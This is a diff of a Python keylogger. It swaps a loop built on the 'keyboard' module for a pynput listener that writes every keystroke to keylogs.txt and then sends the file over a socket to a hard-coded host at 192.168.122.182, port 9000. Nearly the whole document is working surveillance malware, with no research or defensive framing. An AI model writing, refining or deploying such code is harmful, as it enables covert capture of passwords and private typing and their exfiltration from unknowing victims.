@@ -1,33 +1,33 @@
-import keyboard
 import socket
 import os
+import sys
+from pynput import keyboard
 
-log_file = "keylogs.txt"
-server_ip = "192.168.122.182"
-port = 9000
+def on_press(key):
+    with open("keylogs.txt", "a") as f:
+        f.write(str(key))
+
+def send_file():
+    IP = '192.168.122.182'
+    PORT = 9000
+    
+    with socket.socket() as s:
+        s.connect((IP, PORT))
+        
+        with open("keylogs.txt", "rb") as f:
+            data = f.read(1024)
+            
+            while data:
+                s.sendall(data)
+                data = f.read(1024)
 
 def main():
     print("Starting keylogger...")
     
-    while True:
-        events = keyboard.read_event()
-        
-        if events.name not in keyboard.all_modifiers:
-            with open(log_file, "a") as f:
-                f.write(str(events.name))
-                print("Key pressed: ", str(events.name))
-                
-    send_log()
-
-def send_log():
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-        s.connect((server_ip, port))
-        
-        with open(log_file, "rb") as f:
-            data = f.read()
-            s.sendall(data)
-            
-        print("Log file sent to", server_ip)
+    with keyboard.Listener(on_press=on_press) as listener:
+        listener.join()
+    
+    send_file()
 
 if __name__ == "__main__":
     main()
